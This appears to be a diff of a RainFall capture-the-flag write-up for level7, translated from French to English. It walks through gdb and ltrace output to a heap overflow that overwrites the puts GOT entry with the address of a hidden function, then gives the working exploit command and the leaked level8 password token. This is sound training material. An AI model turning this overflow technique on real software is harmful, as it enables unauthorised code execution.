@@ -58,6 +58,8 @@ Dump of assembler code for function main:
    0x08048602 <+225>:   ret
 End of assembler dump.
 
+with objdump -d level7 we can see that there a "m" function wich is not call in main:
+
 (gdb) disass m
 Dump of assembler code for function m:
    0x080484f4 <+0>:     push   %ebp
@@ -74,10 +76,12 @@ Dump of assembler code for function m:
    0x08048520 <+44>:    ret
 End of assembler dump.
 
-En testant, on comprend que notre programme a besoin de deux parametres afin de se lancer.
-Si on lance la fonction normalement avec 2 arguments courts, le puts en +214 nous ecris ~~.
-Pour mieux comprendre on utilise ltrace
 
+When we test our programm, we understood that we must pass 2 paramteter. 
+
+When we launch with 2 parameters, we can see that puts write "~~" 
+
+We launch ltrace (this is basic dumb shit we ever do when we start a level in order to understand)
 level7@RainFall:~$ ltrace ./level7 coucouco cc
 __libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
 malloc(8)                                         = 0x0804a008
@@ -91,8 +95,9 @@ fgets( <unfinished ...>
 --- SIGSEGV (Segmentation fault) ---
 +++ killed by SIGSEGV +++
 
-Donc argv1 est la source du premier strcpy et argv2 du second.
-Si la premiere chaine depasse 20char, on observe quelle deborde sur la destination du second strcpy
+Argv1 is the src of the 1st strcpu and argv2 is the 2nd
+
+If the first arg got a lenght > 20 char, we can see that it overlap on the 2nd strcpy
 
 level7@RainFall:~$ ltrace ./level7 coucoucoucoucoucouccAAAA coucou
 __libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
@@ -104,20 +109,23 @@ strcpy(0x0804a018, "coucoucoucoucoucouccAAAA")    = 0x0804a018
 strcpy(0x41414141, "coucou" <unfinished ...>
 --- SIGSEGV (Segmentation fault) ---
 
-Nous remarquons que fopen prend deux arguments:
+We can see that fopen need 2 args:
 fd = fopen("/home/user/level8/.pass","r");
 
-et que fgets prend 3 arguments:
+and fgets take 3 args:
 fgets(c, 68, fd);
 
-La constante globale c est donc une chaine de caractère qui récupère ce qu'il y a dans le fd soit
-le token contenu dans /home/user/level8/.pass
+const global c is a string that get what fget read in the file open with fopen. So in this case token in /home/user/level8/.pass
 
-On remarque la fonction m qui n'est pas utilisée dans ce programme et qui affiche avec un printf la variable globale c
-ainsi que time. Nous devons donc trouver un moyen que le programme se déroule sans encombres jusqu'après fgets puis qu'on appelle m.
-Nous allons donc remplacer puts par l'appelle de m. On utilise pour cela strcpy:
+We talk earlier about m function, AANND this function print what is load in c (and time but we don't care).
+
+We need to replace puts call by an m call. So we'll use strcpy overflow that we see before.
+
+We put in the 2e strcpy destination (dynamic adress of puts) and in the src adress of m.
 On met dans le 2e strcpy la destination (adresse dynamique de puts) et dans la source l'adresse de m.
-La fonction m est donc appelée à la place de puts.
+
+So m funciton it's call:
+
 
 level7@RainFall:~$ ./level7 $(python -c 'print 20*"A"+"\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
